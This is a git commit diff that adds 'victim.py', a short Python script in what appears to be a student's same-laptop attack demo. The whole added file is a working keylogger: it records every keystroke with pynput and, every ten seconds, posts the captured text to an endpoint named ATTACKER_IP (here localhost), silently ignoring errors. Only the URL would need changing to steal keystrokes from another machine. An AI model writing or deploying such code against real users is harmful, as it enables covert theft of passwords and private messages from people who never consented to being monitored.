2eb0dee2eaf8f10dc8a0817f6bc153a0f3da170d
Vasudev Nigam <25je0749@iitism.ac.in>
2026-01-11 05:21:19 +0530

    Update victim.py

--- in_same_laptop/victim.py
+++ in_same_laptop/victim.py
@@ -1,1 +1,43 @@
+from pynput import keyboard
+import requests 
+import threading
 
+
+ATTACKER_IP = "http://127.0.0.1:5000/upload" 
+
+captured_keys = ""
+
+def send_data():
+    global captured_keys
+    if len(captured_keys) > 0:
+        try:
+           
+            payload = {'keys': captured_keys}
+            requests.post(ATTACKER_IP, data=payload)
+            
+           
+            captured_keys = "" 
+        except:
+            pass 
+            
+   
+    threading.Timer(10, send_data).start()
+
+def on_press(key):
+    global captured_keys
+    try:
+        captured_keys += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            captured_keys += " "
+        elif key == keyboard.Key.enter:
+            captured_keys += " [ENTER] "
+        else:
+            captured_keys += f" [{str(key)}] "
+
+
+send_data()
+
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
